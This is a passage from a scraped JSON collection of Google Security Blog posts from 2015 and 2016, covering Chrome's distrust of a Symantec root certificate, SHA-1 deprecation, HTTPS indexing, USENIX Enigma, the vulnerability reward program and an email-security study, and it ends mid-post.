{"website": "Google-Security", "title": "\nProactive measures in digital certificate security\n", "author": ["Posted by Ryan Sleevi, Software Engineer"], "link": "https://security.googleblog.com/2015/12/proactive-measures-in-digital.html", "abstract": "                             Posted by Ryan Sleevi, Software Engineer     Over the course of the coming weeks, Google will be moving to distrust the &#8220;Class 3 Public Primary CA&#8221; root certificate operated by Symantec Corporation, across Chrome, Android, and Google products. We are taking this action in response to a  notification by Symantec Corporation  that, as of December 1, 2015, Symantec has decided that this root will no longer comply with the  CA/Browser Forum&#8217;s Baseline Requirements . As these requirements reflect industry best practice and are the foundation for publicly trusted certificates, the failure to comply with these represents an unacceptable risk to users of Google products.    Symantec has informed us they intend to use this root certificate for purposes other than publicly-trusted certificates. However, as this root certificate will no longer adhere to the CA/Browser Forum&#8217;s Baseline Requirements, Google is no longer able to ensure that the root certificate, or certificates issued from this root certificate, will not be used to intercept, disrupt, or impersonate the secure communication of Google&#8217;s products or users. As Symantec is unwilling to specify the new purposes for these certificates, and as they are aware of the risk to Google&#8217;s users, they have requested that Google take preventative action by removing and distrusting this root certificate. This step is necessary because this root certificate is widely trusted on platforms such as Android, Windows, and versions of OS X prior to OS X 10.11, and thus certificates Symantec issues under this root certificate would otherwise be treated as trustworthy.    Symantec has indicated that they do not believe their customers, who are the operators of secure websites, will be affected by this removal. Further, Symantec has also indicated that, to the best of their knowledge, they do not believe customers who attempt to access sites secured with Symantec certificates will be affected by this. Users or site operators who encounter issues with this distrusting and removal should  contact Symantec Technical Support .     Further Technical Details of Affected Root:    Friendly Name:  Class 3 Public Primary Certification Authority   Subject:  C=US, O=VeriSign, Inc., OU=Class 3 Public Primary Certification Authority   Public Key Hash (SHA-1):  E2:7F:7B:D8:77:D5:DF:9E:0A:3F:9E:B4:CB:0E:2E:A9:EF:DB:69:77   Public Key Hash (SHA-256):   B1:12:41:42:A5:A1:A5:A2:88:19:C7:35:34:0E:FF:8C:9E:2F:81:68:FE:E3:BA:18:7F:25:3B:C1:A3:92:D7:E2     MD2 Version    Fingerprint (SHA-1):  74:2C:31:92:E6:07:E4:24:EB:45:49:54:2B:E1:BB:C5:3E:61:74:E2   Fingerprint (SHA-256):  E7:68:56:34:EF:AC:F6:9A:CE:93:9A:6B:25:5B:7B:4F:AB:EF:42:93:5B:50:A2:65:AC:B5:CB:60:27:E4:4E:70     SHA1 Version    Fingerprint (SHA-1) : A1:DB:63:93:91:6F:17:E4:18:55:09:40:04:15:C7:02:40:B0:AE:6B   Fingerprint (SHA-256) : A4:B6:B3:99:6F:C2:F3:06:B3:FD:86:81:BD:63:41:3D:8C:50:09:CC:4F:A3:29:C2:CC:F0:E2:FA:1B:14:03:05                                      Posted by Ryan Sleevi, Software Engineer  Over the course of the coming weeks, Google will be moving to distrust the “Class 3 Public Primary CA” root certificate operated by Symantec Corporation, across Chrome, Android, and Google products. We are taking this action in response to a notification by Symantec Corporation that, as of December 1, 2015, Symantec has decided that this root will no longer comply with the CA/Browser Forum’s Baseline Requirements. As these requirements reflect industry best practice and are the foundation for publicly trusted certificates, the failure to comply with these represents an unacceptable risk to users of Google products.  Symantec has informed us they intend to use this root certificate for purposes other than publicly-trusted certificates. However, as this root certificate will no longer adhere to the CA/Browser Forum’s Baseline Requirements, Google is no longer able to ensure that the root certificate, or certificates issued from this root certificate, will not be used to intercept, disrupt, or impersonate the secure communication of Google’s products or users. As Symantec is unwilling to specify the new purposes for these certificates, and as they are aware of the risk to Google’s users, they have requested that Google take preventative action by removing and distrusting this root certificate. This step is necessary because this root certificate is widely trusted on platforms such as Android, Windows, and versions of OS X prior to OS X 10.11, and thus certificates Symantec issues under this root certificate would otherwise be treated as trustworthy.  Symantec has indicated that they do not believe their customers, who are the operators of secure websites, will be affected by this removal. Further, Symantec has also indicated that, to the best of their knowledge, they do not believe customers who attempt to access sites secured with Symantec certificates will be affected by this. Users or site operators who encounter issues with this distrusting and removal should contact Symantec Technical Support.  Further Technical Details of Affected Root: Friendly Name: Class 3 Public Primary Certification Authority Subject: C=US, O=VeriSign, Inc., OU=Class 3 Public Primary Certification Authority Public Key Hash (SHA-1): E2:7F:7B:D8:77:D5:DF:9E:0A:3F:9E:B4:CB:0E:2E:A9:EF:DB:69:77 Public Key Hash (SHA-256): B1:12:41:42:A5:A1:A5:A2:88:19:C7:35:34:0E:FF:8C:9E:2F:81:68:FE:E3:BA:18:7F:25:3B:C1:A3:92:D7:E2  MD2 Version Fingerprint (SHA-1): 74:2C:31:92:E6:07:E4:24:EB:45:49:54:2B:E1:BB:C5:3E:61:74:E2 Fingerprint (SHA-256): E7:68:56:34:EF:AC:F6:9A:CE:93:9A:6B:25:5B:7B:4F:AB:EF:42:93:5B:50:A2:65:AC:B5:CB:60:27:E4:4E:70  SHA1 Version Fingerprint (SHA-1): A1:DB:63:93:91:6F:17:E4:18:55:09:40:04:15:C7:02:40:B0:AE:6B Fingerprint (SHA-256): A4:B6:B3:99:6F:C2:F3:06:B3:FD:86:81:BD:63:41:3D:8C:50:09:CC:4F:A3:29:C2:CC:F0:E2:FA:1B:14:03:05      ", "date": "December 11, 2015"},
{"website": "Google-Security", "title": "\nIndexing HTTPS pages by default\n", "author": ["Posted by ", ", WTA, and the Google Security and Indexing teams"], "link": "https://security.googleblog.com/2015/12/indexing-https-pages-by-default.html", "abstract": "                             Posted by  Zineb Ait Bahajji , WTA, and the Google Security and Indexing teams      [Cross-posted from the  Webmaster Central Blog ]     At Google, user security has always been a top priority. Over the years, we&#8217;ve worked hard to promote a more secure web and to provide a better browsing experience for users.  Gmail ,  Google search , and YouTube have had secure connections for some time, and we also started giving a slight  ranking boost to HTTPS URLs  in search results last year. Browsing the web should be a private experience between the user and the website, and must not be subject to  eavesdropping ,  man-in-the-middle attacks , or data modification. This is why we&#8217;ve been strongly promoting  HTTPS everywhere .    As a natural continuation of this, today we'd like to announce that we're adjusting our indexing system to look for more HTTPS pages. Specifically, we&#8217;ll start crawling HTTPS equivalents of HTTP pages, even when the former are not linked to from any page. When two URLs from the same domain appear to have the same content but are served over different protocol schemes, we&#8217;ll typically choose to index the HTTPS URL if:       It doesn&#8217;t contain insecure dependencies.   It isn&#8217;t blocked from crawling by robots.txt.   It doesn&#8217;t redirect users to or through an insecure HTTP page.   It doesn&#8217;t have a rel=\"canonical\" link to the HTTP page.   It doesn&#8217;t contain a noindex robots meta tag.   It doesn&#8217;t have on-host outlinks to HTTP URLs.   The sitemaps lists the HTTPS URL, or doesn&#8217;t list the HTTP version of the URL.   The server has a valid TLS certificate.           Although our systems prefer the HTTPS version by default, you can also make this clearer for other search engines by redirecting your HTTP site to your HTTPS version and by implementing the  HSTS header  on your server.         We&#8217;re excited about taking another step forward in making the web more secure. By showing users HTTPS pages in our search results, we&#8217;re hoping to decrease the risk for users to browse a website over an insecure connection and making themselves vulnerable to content injection attacks. As usual, if you have any questions or comments, please let us know in the comments section below or in our  webmaster help forums .                                          Posted by Zineb Ait Bahajji, WTA, and the Google Security and Indexing teams  [Cross-posted from the Webmaster Central Blog]  At Google, user security has always been a top priority. Over the years, we’ve worked hard to promote a more secure web and to provide a better browsing experience for users. Gmail, Google search, and YouTube have had secure connections for some time, and we also started giving a slight ranking boost to HTTPS URLs in search results last year. Browsing the web should be a private experience between the user and the website, and must not be subject to eavesdropping, man-in-the-middle attacks, or data modification. This is why we’ve been strongly promoting HTTPS everywhere.  As a natural continuation of this, today we'd like to announce that we're adjusting our indexing system to look for more HTTPS pages. Specifically, we’ll start crawling HTTPS equivalents of HTTP pages, even when the former are not linked to from any page. When two URLs from the same domain appear to have the same content but are served over different protocol schemes, we’ll typically choose to index the HTTPS URL if:   It doesn’t contain insecure dependencies. It isn’t blocked from crawling by robots.txt. It doesn’t redirect users to or through an insecure HTTP page. It doesn’t have a rel=\"canonical\" link to the HTTP page. It doesn’t contain a noindex robots meta tag. It doesn’t have on-host outlinks to HTTP URLs. The sitemaps lists the HTTPS URL, or doesn’t list the HTTP version of the URL. The server has a valid TLS certificate.     Although our systems prefer the HTTPS version by default, you can also make this clearer for other search engines by redirecting your HTTP site to your HTTPS version and by implementing the HSTS header on your server.    We’re excited about taking another step forward in making the web more secure. By showing users HTTPS pages in our search results, we’re hoping to decrease the risk for users to browse a website over an insecure connection and making themselves vulnerable to content injection attacks. As usual, if you have any questions or comments, please let us know in the comments section below or in our webmaster help forums.       ", "date": "December 17, 2015"},
{"website": "Google-Security", "title": "\nAn update on SHA-1 certificates in Chrome\n", "author": ["Posted by Lucas Garron, Chrome security and David Benjamin, Chrome networking"], "link": "https://security.googleblog.com/2015/12/an-update-on-sha-1-certificates-in.html", "abstract": "                             Posted by Lucas Garron, Chrome security and David Benjamin, Chrome networking     As  announced last September  and supported by  further recent research , Google Chrome does not treat SHA-1 certificates as secure anymore, and will completely stop supporting them over the next year. Chrome will discontinue support in two steps: first, blocking new SHA-1 certificates; and second, blocking all SHA-1 certificates.     Step 1: Blocking new SHA-1 certificates       Starting in early 2016 with Chrome version 48, Chrome will display a certificate error if it encounters a site with a leaf certificate that:       is signed with a SHA-1-based signature   is issued on or after January 1, 2016   chains to a public CA             We are hopeful that no one will encounter this error, since public CAs must stop issuing SHA-1 certificates in 2016 per the  Baseline Requirements for SSL .         In addition, a later version of Chrome in 2016 may extend these criteria in order to help guard against SHA-1 collision attacks on older devices, by displaying a certificate error for sites with certificate chains that:&nbsp;       contain an intermediate or leaf certificate signed with a SHA-1-based signature   contain an intermediate or leaf certificate issued on or after January 1, 2016   chain to a public CA    (Note that the first two criteria can match different certificates.)         Note that sites using new SHA-1 certificates that chain to local trust anchors (rather than public CAs) will continue to work without a certificate error. However, they will still be subject to the UI downgrade specified in our  original announcement .          Step 2: Blocking all SHA-1 certificates          Starting January 1, 2017 at the latest, Chrome will completely stop supporting SHA-1 certificates. At this point, sites that have a SHA-1-based signature as part of the certificate chain (not including the self-signature on the root certificate) will trigger a fatal network error. This includes certificate chains that end in a local trust anchor as well as those that end at a public CA.         In line with  Microsoft Edge  and  Mozilla Firefox , the target date for this step is January 1, 2017, but we are considering moving it earlier to July 1, 2016 in light of ongoing research. We therefore urge sites to replace any remaining SHA-1 certificates as soon as possible.         Note that Chrome uses the certificate trust settings of the host OS where possible, and that an update such as Microsoft&#8217;s  planned change  will cause a fatal network error in Chrome, regardless of Chrome&#8217;s intended target date.          Keeping your site safe and compatible          As individual TLS features are found to be too weak, browsers need to drop support for those features to keep users safe. Unfortunately, SHA-1 certificates are not the only feature that browsers will remove in the near future.         As we  announced  on our security-dev mailing list, Chrome 48 will also stop supporting RC4 cipher suites for TLS connections. This aligns with timelines for  Microsoft Edge  and  Mozilla Firefox .         For security and interoperability in the face of upcoming browser changes, site operators should ensure that their servers use SHA-2 certificates, support non-RC4 cipher suites, and follow TLS best practices. In particular, we recommend that most sites support TLS 1.2 and prioritize the ECDHE_RSA_WITH_AES_128_GCM cipher suite. We also encourage site operators to use tools like the  SSL Labs server test  and  Mozilla's SSL Configuration Generator .                                     Posted by Lucas Garron, Chrome security and David Benjamin, Chrome networking  As announced last September and supported by further recent research, Google Chrome does not treat SHA-1 certificates as secure anymore, and will completely stop supporting them over the next year. Chrome will discontinue support in two steps: first, blocking new SHA-1 certificates; and second, blocking all SHA-1 certificates.  Step 1: Blocking new SHA-1 certificates  Starting in early 2016 with Chrome version 48, Chrome will display a certificate error if it encounters a site with a leaf certificate that:   is signed with a SHA-1-based signature is issued on or after January 1, 2016 chains to a public CA     We are hopeful that no one will encounter this error, since public CAs must stop issuing SHA-1 certificates in 2016 per the Baseline Requirements for SSL.    In addition, a later version of Chrome in 2016 may extend these criteria in order to help guard against SHA-1 collision attacks on older devices, by displaying a certificate error for sites with certificate chains that:    contain an intermediate or leaf certificate signed with a SHA-1-based signature contain an intermediate or leaf certificate issued on or after January 1, 2016 chain to a public CA  (Note that the first two criteria can match different certificates.)    Note that sites using new SHA-1 certificates that chain to local trust anchors (rather than public CAs) will continue to work without a certificate error. However, they will still be subject to the UI downgrade specified in our original announcement.    Step 2: Blocking all SHA-1 certificates    Starting January 1, 2017 at the latest, Chrome will completely stop supporting SHA-1 certificates. At this point, sites that have a SHA-1-based signature as part of the certificate chain (not including the self-signature on the root certificate) will trigger a fatal network error. This includes certificate chains that end in a local trust anchor as well as those that end at a public CA.    In line with Microsoft Edge and Mozilla Firefox, the target date for this step is January 1, 2017, but we are considering moving it earlier to July 1, 2016 in light of ongoing research. We therefore urge sites to replace any remaining SHA-1 certificates as soon as possible.    Note that Chrome uses the certificate trust settings of the host OS where possible, and that an update such as Microsoft’s planned change will cause a fatal network error in Chrome, regardless of Chrome’s intended target date.    Keeping your site safe and compatible    As individual TLS features are found to be too weak, browsers need to drop support for those features to keep users safe. Unfortunately, SHA-1 certificates are not the only feature that browsers will remove in the near future.    As we announced on our security-dev mailing list, Chrome 48 will also stop supporting RC4 cipher suites for TLS connections. This aligns with timelines for Microsoft Edge and Mozilla Firefox.    For security and interoperability in the face of upcoming browser changes, site operators should ensure that their servers use SHA-2 certificates, support non-RC4 cipher suites, and follow TLS best practices. In particular, we recommend that most sites support TLS 1.2 and prioritize the ECDHE_RSA_WITH_AES_128_GCM cipher suite. We also encourage site operators to use tools like the SSL Labs server test and Mozilla's SSL Configuration Generator.     ", "date": "December 18, 2015"},
{"website": "Google-Security", "title": "\nWhy attend USENIX Enigma?\n", "author": ["Posted by Parisa Tabriz, Security Princess & Enigma Program Co-Chair"], "link": "https://security.googleblog.com/2016/01/why-attend-usenix-enigma.html", "abstract": "                             Posted by Parisa Tabriz, Security Princess &amp; Enigma Program Co-Chair      [Cross-posted from the  Google Research Blog ]     Last August, we  announced USENIX Enigma , a new conference intended to shine a light on great, thought-provoking research in security, privacy, and electronic crime. With Enigma beginning in just a few short weeks, I wanted to share a couple of the reasons I&#8217;m personally excited about this new conference.    Enigma aims to bridge the divide that exists between experts working in academia, industry, and public service, explicitly bringing researchers from different sectors together to share their work. Our speakers include those spearheading the defense of digital rights ( Electronic Frontier Foundation ,  Access Now ), practitioners at a number of well known industry leaders ( Akamai ,  Blackberry ,  Facebook ,  LinkedIn ,  Netflix ,  Twitter ), and researchers from multiple universities in the U.S. and abroad. With the diverse  session topics and organizations represented , I expect interesting&#8212;and perhaps spirited&#8212;coffee break and lunchtime discussions among the equally diverse list of conference attendees.    Of course, I&#8217;m very proud to have some of my Google colleagues speaking at Enigma:     Adrienne Porter Felt will talk about blending research and engineering to solve usable security problems. You&#8217;ll hear how Chrome&#8217;s usable security team runs user studies and experiments to motivate engineering and design decisions. Adrienne will share the challenges they&#8217;ve faced when trying to adapt existing usable security research to practice, and give insight into how they&#8217;ve achieved successes.       Ben Hawkes will be speaking about  Project Zero , a security research team dedicated to the mission of, &#8220;making  0day  hard.&#8221; Ben will talk about why Project Zero exists, and some of the recent trends and technologies that make vulnerability discovery and exploitation fundamentally harder.       Kostya Serebryany will be presenting a 3-pronged approach to securing C++ code based on his many years of experiencing wrangling complex, buggy software. Kostya will survey multiple dynamic sanitizing tools him and his team have made publicly available, review control-flow and data-flow guided fuzzing, and explain a method to harden your code in the presence of any bugs that remain.       Elie Bursztein will go through key lessons the Gmail team learned over the past 11 years while protecting users from spam, phishing, malware, and web attacks. Illustrated with concrete numbers and examples from one of the largest email systems on the planet, attendees will gain insight into specific techniques and approaches useful in fighting abuse and securing their online services.            In addition to raw content, my Program Co-Chair,  David Brumley , and I have prioritized talk quality. Researchers dedicate months or years of their time to thinking about a problem and conducting the technical work of research, but a common criticism of technical conferences is that the actual presentation of that research seems like an afterthought. Rather than be a regurgitation of a research paper in slide format, a presentation is an opportunity for a researcher to explain the context and impact of their work in their own voice; a chance to inspire the audience to want to learn more or dig deeper. Taking inspiration from the  TED conference , Enigma will have shorter presentations, and the program committee has worked with each speaker to help them craft the best version of their talk.&nbsp;         Hope to see some of you at  USENIX Enigma  later this month!                                        Posted by Parisa Tabriz, Security Princess & Enigma Program Co-Chair  [Cross-posted from the Google Research Blog]  Last August, we announced USENIX Enigma, a new conference intended to shine a light on great, thought-provoking research in security, privacy, and electronic crime. With Enigma beginning in just a few short weeks, I wanted to share a couple of the reasons I’m personally excited about this new conference.  Enigma aims to bridge the divide that exists between experts working in academia, industry, and public service, explicitly bringing researchers from different sectors together to share their work. Our speakers include those spearheading the defense of digital rights (Electronic Frontier Foundation, Access Now), practitioners at a number of well known industry leaders (Akamai, Blackberry, Facebook, LinkedIn, Netflix, Twitter), and researchers from multiple universities in the U.S. and abroad. With the diverse session topics and organizations represented, I expect interesting—and perhaps spirited—coffee break and lunchtime discussions among the equally diverse list of conference attendees.  Of course, I’m very proud to have some of my Google colleagues speaking at Enigma:  Adrienne Porter Felt will talk about blending research and engineering to solve usable security problems. You’ll hear how Chrome’s usable security team runs user studies and experiments to motivate engineering and design decisions. Adrienne will share the challenges they’ve faced when trying to adapt existing usable security research to practice, and give insight into how they’ve achieved successes.   Ben Hawkes will be speaking about Project Zero, a security research team dedicated to the mission of, “making 0day hard.” Ben will talk about why Project Zero exists, and some of the recent trends and technologies that make vulnerability discovery and exploitation fundamentally harder.   Kostya Serebryany will be presenting a 3-pronged approach to securing C++ code based on his many years of experiencing wrangling complex, buggy software. Kostya will survey multiple dynamic sanitizing tools him and his team have made publicly available, review control-flow and data-flow guided fuzzing, and explain a method to harden your code in the presence of any bugs that remain.   Elie Bursztein will go through key lessons the Gmail team learned over the past 11 years while protecting users from spam, phishing, malware, and web attacks. Illustrated with concrete numbers and examples from one of the largest email systems on the planet, attendees will gain insight into specific techniques and approaches useful in fighting abuse and securing their online services.     In addition to raw content, my Program Co-Chair, David Brumley, and I have prioritized talk quality. Researchers dedicate months or years of their time to thinking about a problem and conducting the technical work of research, but a common criticism of technical conferences is that the actual presentation of that research seems like an afterthought. Rather than be a regurgitation of a research paper in slide format, a presentation is an opportunity for a researcher to explain the context and impact of their work in their own voice; a chance to inspire the audience to want to learn more or dig deeper. Taking inspiration from the TED conference, Enigma will have shorter presentations, and the program committee has worked with each speaker to help them craft the best version of their talk.     Hope to see some of you at USENIX Enigma later this month!      ", "date": "January 11, 2016"},
{"website": "Google-Security", "title": "\nGoogle Security Rewards - 2015 Year in Review\n", "author": ["Posted by Eduardo Vela Nava, Google Security"], "link": "https://security.googleblog.com/2016/01/google-security-rewards-2015-year-in.html", "abstract": "                             Posted by Eduardo Vela Nava, Google Security     We launched our  Vulnerability Reward Program  in 2010 because rewarding security researchers for their hard work benefits everyone. These financial rewards help make our services, and the web as a whole, safer and more secure.    With an open approach, we&#8217;re able to consider a broad diversity of expertise for individual issues. We can also offer incentives for external researchers to work on challenging, time-consuming, projects that otherwise may not receive proper attention.    Last January, we summarized these efforts in our first ever  Security Reward Program &#8216;Year in Review&#8217; . Now, at the beginning of another new year, we wanted to look back at 2015 and again show our appreciation for researchers&#8217; important contributions.     2015 at a Glance     Once again, researchers from around the world&#8212;Great Britain, Poland, Germany, Romania, Israel, Brazil, United States, China, Russia, India to name a few countries&#8212;participated our program.    Here's an overview of the rewards they received and broader milestones for the program, as a whole.            Android Joins Security Rewards          Android was a newcomer to the Security Reward program initiative in 2015 and it made a significant and immediate impact as soon as it joined the program.         We  launched  our Android VRP in June, and by the end of 2015, we had paid more than $200,000 to researchers for their work, including our largest single payment of $37,500 to an Android security researcher.          New Vulnerability Research Grants Pay Off          Last year, we began to provide researchers with  Vulnerability Research Grants , lump sums of money that researchers receive before starting their investigations. The purpose of these grants is to ensure that researchers are rewarded for their hard work, even if they don&#8217;t find a vulnerability.         We&#8217;ve already seen positive results from this program; here&#8217;s one example. Kamil Histamullin a researcher from Kasan, Russia received a VRP grant early last year. Shortly thereafter, he found an issue in YouTube Creator Studio which would have enabled anyone to delete any video from YouTube by simply changing a parameter from the URL. After the issue was reported, our teams quickly fixed it and the researcher was was rewarded $5,000 in addition to his initial research grant. Kamil detailed his findings on his  personal blog  in March.          Established Programs Continue to Grow          We continued to see important security research in our established programs in 2015. Here are just a few examples:         Tomasz Bojarski found 70 bugs on Google in 2015, and was our most prolific researcher of the year. He found a bug in our vulnerability submission form.   You may have read about Sanmay Ved, a researcher from who was able to buy google.com for one minute on Google Domains. Our initial financial reward to Sanmay&#8212;$ 6,006.13&#8212;spelled-out Google, numerically (squint a little and you&#8217;ll see it!). We then doubled this amount when  Sanmay donated his reward to charity .      We also injected some new energy into these existing research programs and grants. In December, we  announced  that we'd be dedicating one million dollars specifically for security research related to Google Drive.         We&#8217;re looking forward to continuing the Security Reward Program&#8217;s growth in 2016. Stay tuned for more exciting reward program changes throughout the year.                                     Posted by Eduardo Vela Nava, Google Security  We launched our Vulnerability Reward Program in 2010 because rewarding security researchers for their hard work benefits everyone. These financial rewards help make our services, and the web as a whole, safer and more secure.  With an open approach, we’re able to consider a broad diversity of expertise for individual issues. We can also offer incentives for external researchers to work on challenging, time-consuming, projects that otherwise may not receive proper attention.  Last January, we summarized these efforts in our first ever Security Reward Program ‘Year in Review’. Now, at the beginning of another new year, we wanted to look back at 2015 and again show our appreciation for researchers’ important contributions.  2015 at a Glance  Once again, researchers from around the world—Great Britain, Poland, Germany, Romania, Israel, Brazil, United States, China, Russia, India to name a few countries—participated our program.  Here's an overview of the rewards they received and broader milestones for the program, as a whole.    Android Joins Security Rewards    Android was a newcomer to the Security Reward program initiative in 2015 and it made a significant and immediate impact as soon as it joined the program.    We launched our Android VRP in June, and by the end of 2015, we had paid more than $200,000 to researchers for their work, including our largest single payment of $37,500 to an Android security researcher.    New Vulnerability Research Grants Pay Off    Last year, we began to provide researchers with Vulnerability Research Grants, lump sums of money that researchers receive before starting their investigations. The purpose of these grants is to ensure that researchers are rewarded for their hard work, even if they don’t find a vulnerability.    We’ve already seen positive results from this program; here’s one example. Kamil Histamullin a researcher from Kasan, Russia received a VRP grant early last year. Shortly thereafter, he found an issue in YouTube Creator Studio which would have enabled anyone to delete any video from YouTube by simply changing a parameter from the URL. After the issue was reported, our teams quickly fixed it and the researcher was was rewarded $5,000 in addition to his initial research grant. Kamil detailed his findings on his personal blog in March.    Established Programs Continue to Grow    We continued to see important security research in our established programs in 2015. Here are just a few examples:    Tomasz Bojarski found 70 bugs on Google in 2015, and was our most prolific researcher of the year. He found a bug in our vulnerability submission form. You may have read about Sanmay Ved, a researcher from who was able to buy google.com for one minute on Google Domains. Our initial financial reward to Sanmay—$ 6,006.13—spelled-out Google, numerically (squint a little and you’ll see it!). We then doubled this amount when Sanmay donated his reward to charity.   We also injected some new energy into these existing research programs and grants. In December, we announced that we'd be dedicating one million dollars specifically for security research related to Google Drive.    We’re looking forward to continuing the Security Reward Program’s growth in 2016. Stay tuned for more exciting reward program changes throughout the year.     ", "date": "January 28, 2016"},
{"website": "Google-Security", "title": "\nSustaining Digital Certificate Security\n", "author": ["Posted by Ryan Sleevi, Software Engineer"], "link": "https://security.googleblog.com/2015/10/sustaining-digital-certificate-security.html", "abstract": "                             Posted by Ryan Sleevi, Software Engineer      This post updates our  previous notification  of a misissued certificate for google.com     Following our notification, Symantec published  a report  in response to our inquiries and disclosed that 23 test certificates had been issued without the domain owner&#8217;s knowledge covering five organizations, including Google and Opera.    However, we were still able to find several more questionable certificates using only the Certificate Transparency logs and a few minutes of work. We shared these results with other root store operators on October 6th, to allow them to independently assess and verify our research.    Symantec performed another audit and, on October 12th, announced that they had found an additional  164 certificates  over 76 domains and  2,458 certificates  issued for domains that were never registered.      It&#8217;s obviously concerning that a CA would have such a long-running issue and that they would be unable to assess its scope after being alerted to it and conducting an audit. Therefore we are firstly going to require that as of June 1st, 2016, all certificates issued by Symantec itself will be required to support Certificate Transparency. In this case, logging of non-EV certificates would have provided significantly greater insight into the problem and may have allowed the problem to be detected sooner.       After this date, certificates newly issued by Symantec that do not conform to the Chromium Certificate Transparency policy may result in interstitials or other problems when used in Google products.       More immediately, we are requesting of Symantec that they further update their public incident report with:      A post-mortem analysis that details why they did not detect the additional certificates that we found.   Details of each of the failures to uphold the relevant Baseline Requirements and EV Guidelines and what they believe the individual root cause was for each failure.    We are also requesting that Symantec provide us with a detailed set of steps they will take to correct and prevent each of the identified failures, as well as a timeline for when they expect to complete such work. Symantec may consider this latter information to be confidential and so we are not requesting that this be made public.         Following the implementation of these corrective steps, we expect Symantec to undergo a Point-in-time Readiness Assessment and a third-party security audit. The point-in-time assessment will establish Symantec&#8217;s conformance to each of these standards:       WebTrust Principles and Criteria for Certification Authorities   WebTrust Principles and Criteria for Certification Authorities &#8211; SSL Baseline with Network Security   WebTrust Principles and Criteria for Certification Authorities &#8211; Extended Validation SSL           The third-party security audit must assess:&nbsp;       The veracity of Symantec&#8217;s claims that at no time private keys were exposed to Symantec employees by the tool.   That Symantec employees could not use the tool in question to obtain certificates for which the employee controlled the private key.   That Symantec&#8217;s audit logging mechanism is reasonably protected from modification, deletion, or tampering, as described in Section 5.4.4 of their CPS.             We may take further action as additional information becomes available to us.                                       Posted by Ryan Sleevi, Software Engineer  This post updates our previous notification of a misissued certificate for google.com  Following our notification, Symantec published a report in response to our inquiries and disclosed that 23 test certificates had been issued without the domain owner’s knowledge covering five organizations, including Google and Opera.  However, we were still able to find several more questionable certificates using only the Certificate Transparency logs and a few minutes of work. We shared these results with other root store operators on October 6th, to allow them to independently assess and verify our research.  Symantec performed another audit and, on October 12th, announced that they had found an additional 164 certificates over 76 domains and 2,458 certificates issued for domains that were never registered.  It’s obviously concerning that a CA would have such a long-running issue and that they would be unable to assess its scope after being alerted to it and conducting an audit. Therefore we are firstly going to require that as of June 1st, 2016, all certificates issued by Symantec itself will be required to support Certificate Transparency. In this case, logging of non-EV certificates would have provided significantly greater insight into the problem and may have allowed the problem to be detected sooner.  After this date, certificates newly issued by Symantec that do not conform to the Chromium Certificate Transparency policy may result in interstitials or other problems when used in Google products.  More immediately, we are requesting of Symantec that they further update their public incident report with:  A post-mortem analysis that details why they did not detect the additional certificates that we found. Details of each of the failures to uphold the relevant Baseline Requirements and EV Guidelines and what they believe the individual root cause was for each failure.  We are also requesting that Symantec provide us with a detailed set of steps they will take to correct and prevent each of the identified failures, as well as a timeline for when they expect to complete such work. Symantec may consider this latter information to be confidential and so we are not requesting that this be made public.    Following the implementation of these corrective steps, we expect Symantec to undergo a Point-in-time Readiness Assessment and a third-party security audit. The point-in-time assessment will establish Symantec’s conformance to each of these standards:   WebTrust Principles and Criteria for Certification Authorities WebTrust Principles and Criteria for Certification Authorities – SSL Baseline with Network Security WebTrust Principles and Criteria for Certification Authorities – Extended Validation SSL     The third-party security audit must assess:    The veracity of Symantec’s claims that at no time private keys were exposed to Symantec employees by the tool. That Symantec employees could not use the tool in question to obtain certificates for which the employee controlled the private key. That Symantec’s audit logging mechanism is reasonably protected from modification, deletion, or tampering, as described in Section 5.4.4 of their CPS.      We may take further action as additional information becomes available to us.      ", "date": "October 28, 2015"},
{"website": "Google-Security", "title": "\nNew Research: Encouraging trends and emerging threats in email security\n", "author": [], "link": "https://security.googleblog.com/2015/11/new-research-encouraging-trends-and.html", "abstract": "                            Posted by&nbsp; Elie Bursztein, &nbsp;Anti-Fraud and Abuse Research and Nicolas Lidzborski, Gmail Security Engineering Lead        We&#8217;re constantly working to help make email more secure for everyone. These efforts are reflected in security protections like  default HTTPS  in Gmail as well as our  Safer Email Transparency report , which includes information about email security beyond just Gmail.    To that end, in partnership with the University of Michigan and the University of Illinois, we&#8217;re publishing the results of a  multi-year study  that measured how email security has evolved since 2013. While Gmail was the foundation of this research, the study&#8217;s insights apply to email more broadly, not unlike our  Safer Email Transparency report . It&#8217;s our hope that these findings not only help make Gmail more secure, but will also be used to help protect email users everywhere as well.       Email security strengthens, industry-wide   The study showed that email is more secure today than it was two years ago.&nbsp;Here are some specific findings:               Newer security challenges and how we can address them          Our study identified several new security challenges as well.         First, we found regions of the Internet actively preventing message encryption by tampering with requests to initiate SSL connections. To mitigate this attack, we are working closely with partners through the industry association  M3AAWG  to strengthen &#8220;opportunistic TLS&#8221; using technologies that we pioneered with Chrome to protect websites against interception.         Second, we uncovered malicious DNS servers publishing bogus routing information to email servers looking for Gmail. These nefarious servers are like telephone directories that intentionally list misleading phone numbers for a given name. While this type of attack is rare, it&#8217;s very concerning as it could allow attackers to censor or alter messages before they are relayed to the email recipient.         While these threats do not affect Gmail to Gmail communication, they may affect messaging between providers. To notify our users of potential dangers, we are developing in-product warnings for Gmail users that will display when they receive a message through a non-encrypted connection. These warnings will begin to roll-out in the coming months.         All email services&#8212;Gmail included&#8212;depend on the trust of their users. Partnering with top researchers helps us make the email ecosystem as a whole safer and more secure for everyone. Security threats won&#8217;t disappear, but studies like these enable providers across the industry to fight them with better, more powerful protections today and going forward.          [This work was made possible thanks to the contribution of many Googlers including Vijay Eranti, Kurt Thomas, John Rae-Grant, and Mark Risher.]                                     Posted by Elie Bursztein, Anti-Fraud and Abuse Research and Nicolas Lidzborski, Gmail Security Engineering Lead   We’re constantly working to help make email more secure for everyone. These efforts are reflected in security protections like default HTTPS in Gmail as well as our Safer Email Transparency report, which includes information about email security beyond just Gmail.  To that end, in partnership with the University of Michigan and the University of Illinois, we’re publishing the results of a multi-year study that measured how email security has evolved since 2013. While Gmail was the foundation of this research, the study’s insights apply to email more broadly, not unlike our Safer Email Transparency report. It’s our hope that these findings not only help make Gmail more secure, but will also be used to help protect email users everywhere as well.  Email security strengthens, industry-wide The study showed that email is more secure today than it was two years ago. Here are some specific findings:     Newer security challenges and how we can address them    Our study identified several new security challenges as well.    First, we found regions of the Internet actively preventing message encryption by tampering with requests to initiate SSL connections. To mitigate this attack, we are working closely with partners through the industry association M3AAWG to strengthen “opportunistic TLS” using technologies that we pioneered with Chrome to protect websites against interception.    Second, we uncovered malicious DNS servers publishing bogus routing information to email servers looking for Gmail. These nefarious servers are like telephone directories that intentionally list misleading phone numbers 